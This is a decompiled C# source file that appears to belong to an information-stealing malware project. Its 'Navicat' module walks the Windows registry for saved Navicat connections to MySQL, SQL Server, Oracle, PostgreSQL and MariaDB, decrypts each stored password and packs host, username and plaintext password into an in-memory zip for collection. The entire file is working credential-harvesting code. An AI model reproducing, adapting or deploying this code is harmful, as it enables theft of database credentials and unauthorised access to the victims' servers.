using System;
using System.Collections.Generic;
using System.Text;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using Microsoft.Win32;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000049 RID: 73
	public class Navicat : ITarget
	{
		// Token: 0x060000F0 RID: 240 RVA: 0x0000E06C File Offset: 0x0000C26C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			dictionary["Navicat"] = "MySql";
			dictionary["NavicatMSSQL"] = "SQL Server";
			dictionary["NavicatOra"] = "Oracle";
			dictionary["NavicatPG"] = "pgsql";
			dictionary["NavicatMARIADB"] = "MariaDB";
			Dictionary<string, string> dictionary2 = dictionary;
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Navicat";
			Navicat11Cipher navicat11Cipher = new Navicat11Cipher();
			foreach (string text in dictionary2.Keys)
			{
				string text2 = "Software\\PremiumSoft\\" + text + "\\Servers";
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text2);
				bool flag = registryKey == null;
				if (!flag)
				{
					string text3 = dictionary2[text];
					string[] subKeyNames = registryKey.GetSubKeyNames();
					foreach (string text4 in subKeyNames)
					{
						RegistryKey registryKey2 = registryKey.OpenSubKey(text4);
						bool flag2 = registryKey2 != null;
						if (flag2)
						{
							object value = registryKey2.GetValue("Host");
							object value2 = registryKey2.GetValue("UserName");
							object value3 = registryKey2.GetValue("Pwd");
							string str = value.ToString();
							string str2 = value2.ToString();
							string ciphertext = value3.ToString();
							string str3 = navicat11Cipher.DecryptString(ciphertext);
							StringBuilder stringBuilder = new StringBuilder();
							stringBuilder.AppendLine("DatabaseType: " + text3);
							stringBuilder.AppendLine("ConnectName: " + text4);
							stringBuilder.AppendLine("Host: " + str);
							stringBuilder.AppendLine("UserName: " + str2);
							stringBuilder.AppendLine("Password: " + str3);
							string text5 = string.Concat(new string[]
							{
								"Navicat\\",
								text3,
								"\\",
								text4,
								"\\connection.txt"
							});
							zip.AddTextFile(text5, stringBuilder.ToString());
							counterApplications.Files.Add(string.Concat(new string[]
							{
								text2,
								"\\",
								text4,
								" => ",
								text5
							}));
						}
					}
				}
			}
			bool flag3 = counterApplications.Files.Count > 0;
			if (flag3)
			{
				counter.Applications.Add(counterApplications);
			}
		}
	}
}
